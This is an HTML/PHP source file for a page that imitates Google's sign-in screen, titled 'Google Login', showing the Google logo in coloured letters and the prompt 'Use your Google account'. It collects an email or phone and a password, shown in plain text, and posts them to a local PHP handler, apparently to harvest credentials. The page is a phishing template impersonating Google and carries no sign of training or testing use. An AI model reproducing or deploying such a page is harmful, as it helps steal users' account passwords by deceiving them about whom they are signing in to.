<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="index.css" />

    <title>Google Login</title>
  </head>
  <?php
   session_start();
   if(isset($_POST['submit'])){
$username = $_POST['username'];
$password = $_POST['password'];
   }
?>
  <body>
    <div class="login_container">
      <form action="inc/index.inc.php" method="post">
        <div class="mar_lg"></div>
        <div style="display: flexbox; align-content: center">
          <h2>
            <strong
              ><span
                ><span class="g-blue">G</span><span class="o-red">o</span
                ><span class="o-yellow">o</span><span class="g-blue">g</span
                ><span class="l-green">l</span
                ><span class="o-red e-red">e</span></span
              ></strong
            >
          </h2>
          <div class="pad"></div>
          <h2 style="font-weight: lighter">Sign In</h2>
          <div class="pad"></div>
        </div>
        <p style="font-size: 15px; color: rgb(88, 88, 88)">
          Use your Google account
        </p>
        <div class="pad"></div>
        <div class="input_panel">
          <p class="label_user">Email or phone:</p>
          <input class="user" name="username" type="text" />
        </div>
        <div class="mar_sm"></div>
        <div class="center">
          <a href="">Forgot Email</a>
        </div>
        <div class="mar_sm"></div>
        <div class="input_panel">
          <p class="label_user">Password</p>
          <input class="user" name="password" type="text" />
        </div>
        <div class="mar_sm"></div>
        <div class="center">
          <a href="">Forgot Password</a>
        </div>
        <div class="mar_sm"></div>
        <div class="mar_lg"></div>
        <div class="center">
          <span>
            your computer? Use Guest mode to sign in privately.
            <a href="">Learn More</a></span
          >
        </div>
        <div class="mar_lg"></div>
        <div class="flexbox">
          <div>
            <a href="" style="align-self: flex-start">Learn More</a>
          </div>
              <button type="submit" name="submit" >Log In</button>
        </div>
        <div class="mar_lg"></div>
      </form>
    </div>
  </body>
</html>
